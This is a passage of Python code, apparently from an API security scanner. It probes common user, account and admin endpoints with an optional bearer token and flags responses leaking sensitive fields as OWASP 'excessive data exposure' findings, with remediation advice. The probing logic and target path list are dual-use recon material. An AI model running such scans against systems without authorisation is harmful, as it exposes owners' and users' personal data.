        _HIGH_VALUE_PATHS = [
            "/api/users", "/api/users/me", "/api/profile", "/api/account",
            "/api/me", "/api/v1/users", "/api/v2/users",
            "/api/settings", "/api/config", "/user", "/profile", "/account",
            "/api/admin/users", "/api/customers", "/api/members",
        ]

        endpoints_to_check: List[str] = list(self._discovered_endpoints[:25])
        seen: set = set(endpoints_to_check)
        for path in _HIGH_VALUE_PATHS:
            url = self.target.rstrip("/") + path
            if url not in seen:
                seen.add(url)
                endpoints_to_check.append(url)

        endpoints_to_check = endpoints_to_check[:35]

        for url in endpoints_to_check:
            try:
                headers: Dict[str, str] = {}
                if token:
                    headers["Authorization"] = f"Bearer {token}"
                await asyncio.sleep(self.rate_limit)
                async with session.get(
                    url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=False,
                ) as resp:
                    if resp.status != 200:
                        continue
                    ct = resp.headers.get("Content-Type", "")
                    if "json" not in ct and "text" not in ct:
                        continue
                    body = await resp.text(errors="replace")
                    if len(body) < 20:
                        continue

                    for vuln_type, pattern, severity, description in _CHECKS:
                        match = pattern.search(body)
                        if match:
                            flaws.append({
                                "type":      "excessive_data_exposure",
                                "title":     f"Excessive Data Exposure — {vuln_type.replace('_', ' ').title()}",
                                "severity":  severity,
                                "endpoint":  url,
                                "description": (
                                    f"{description} at {url}. "
                                    "The API returns more data than the client needs (OWASP API #3)."
                                ),
                                "evidence": {
                                    "url":             url,
                                    "field_type":      vuln_type,
                                    "matched":         match.group(0)[:120],
                                    "response_length": len(body),
                                },
                                "confirmed": True,
                                "remediation": [
                                    "Use serializer allow-lists to expose only required fields",
                                    "Never return password hashes, SSNs, credit card data, or private keys",
                                    "Apply field-level access control in your DTO / serializer layer",
                                    "Run a data-classification audit on every public API schema",
                                ],
                            })
                            break  # One finding per endpoint — highest-severity match wins
            except Exception as exc:
                logger.debug("[DataExposure] Error on %s: %s", url, exc)

        logger.info("[DataExposure] %d findings across %d endpoints", len(flaws), len(endpoints_to_check))
        return flaws
